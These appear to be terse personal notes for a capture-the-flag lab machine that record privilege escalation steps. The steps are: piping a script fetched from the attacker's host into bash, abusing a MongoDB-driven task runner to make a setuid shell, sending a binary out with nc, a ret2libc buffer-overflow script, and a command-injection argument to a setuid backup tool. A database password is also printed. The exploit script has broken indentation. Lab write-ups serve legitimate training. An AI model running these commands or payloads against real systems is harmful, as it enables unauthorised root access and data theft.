# LinEnum
```bash
curl 10.10.14.21/linpeas.sh | bash
```
![[Pasted image 20211106220455.png]]

```bash
less /var/scheduler/app.js
```

```bash
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});
/var/scheduler/app.js (END)

```

```bash
mongo -p -u mark scheduler 
```

```bash
> db.tasks.insert({"cmd":"/bin/cp /bin/bash /tmp/dix; /bin/chown tom:admin /tmp/dix; chmod g+s /tmp/dix;chmod u+s /tmp/dix"})
```

```bash
mark@node:~$ ls -la /tmp/dix
-rwsr-sr-x 1 tom admin 1037528 Nov  7 01:46 /tmp/dix2
mark@node:~$ /tmp/dix -p
dix-4.3$ id
uid=1001(mark) gid=1001(mark) euid=1000(tom) egid=1002(admin) groups=1002(admin),1001(mark)
```

```bash
less /var/www/myplace/app.js
```


```bash
  app.get('/api/admin/backup', function (req, res) {
    if (req.session.user && req.session.user.is_admin) {
      var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);
      var backup = ''; 
```
* usr/local/bin/backup -q  45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474  /var/www/myplace


```bash
$ find / -perm -4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/local/bin/backup
/usr/bin/chfn
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/newuidmap
/tmp/dix
/bin/ping
/bin/umount
/bin/fusermount
/bin/ping6
/bin/ntfs-3g
/bin/su
/bin/mount
```

```bash
nc 10.10.14.21 9001 < /usr/local/bin/backup
```

```bash
$ gdb ./backup 

...[snip]...

Reading symbols from ./backup...
(No debugging symbols found in ./backup)
gef➤  checksec
[+] checksec for '/home/dix/htb/node/www/backup'
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

### Exploitation

* ASLR and NX are enabled, so the binary must be exploited by going the ret2libc route.  
Find libc address: ldd /usr/local/bin/backup  
Find libc system function: readelf -s /lib32/libc.so.6 | grep system  
Find libc exit function: readelf -s /lib32/libc.so.6 | grep exit  
Find libc /bin/sh reference: strings -a -t x /lib32/libc.so.6 | grep /bin/sh

```python
import struct, subprocess  
  
libc = 0xf75e2000  
sysOffset = 0x0003a940  
sysAddress = libc + sysOffset  
exitOffset = 0x0002e7b0  
exitAddress = libc + exitOffset  
binsh = libc + 0x0015900b  
  
payload = "A" * 512  
payload += struct.pack("<I", sysAddress)  
payload += struct.pack("<I", exitAddress)  
payload += struct.pack("<I", binsh)  
  
attempts = 0  
  
while True:  
attempts += 1  
print "Attempts: " + attempts  
subprocess.call(["/usr/local/bin/backup", "-i",  
"3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110",  
payload])
```

### Another way (more easy)

```bash
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "asd          
> /bin/bash
> asad"
```